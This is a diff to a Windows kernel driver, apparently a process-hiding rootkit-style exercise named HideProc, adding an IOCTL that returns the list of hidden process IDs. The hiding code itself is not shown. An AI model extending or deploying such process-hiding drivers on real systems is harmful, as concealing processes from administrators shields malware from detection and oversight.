@@ -20,6 +20,9 @@ NTSTATUS HideProcDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 	ULONG inputLen = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
 	ULONG code = IrpSp->Parameters.DeviceIoControl.IoControlCode;
 
+	ULONG outputLen = IrpSp->Parameters.DeviceIoControl.OutputBufferLength;
+
+
 	switch (code) {
 		case IOCTL_UNHIDE_PROCESSES:
 		case IOCTL_HIDE_PROCESSES :
@@ -44,12 +47,42 @@ NTSTATUS HideProcDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 			info = added * sizeof(ULONG);
 			break; 
 		}
+		case IOCTL_SHOW_HIDDEN_PROCESSES:
+		{
+			if (outputLen == 0 || Irp->MdlAddress == NULL) {
+				status = STATUS_INVALID_PARAMETER;
+				info = 0; 
+				break; 
+			}
+
+			PVOID outputBuffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
+			
+			if (!outputBuffer) {
+				status = STATUS_INSUFFICIENT_RESOURCES;
+				info = 0; 
+				break; 
+			}
+
+			//check on the len of the output buffer
+			if (outputLen > (g_state.PidsCount * sizeof(ULONG))) {
+				WriteHiddenProcessesInOutputBuffer((ULONG*)outputBuffer, &g_state);
+				status = STATUS_SUCCESS;
+				info = g_state.PidsCount * sizeof(ULONG);
+				break;
+			}
+			else {
+				status = STATUS_INSUFFICIENT_RESOURCES;
+				info = 0;
+				break; 
+			}
+
+		}
+
 		default:
 			status = STATUS_INVALID_DEVICE_REQUEST;
 			break;
 
-	}
-
+	} 
 	return CompleteRequest(Irp, status, info); 
 }
 
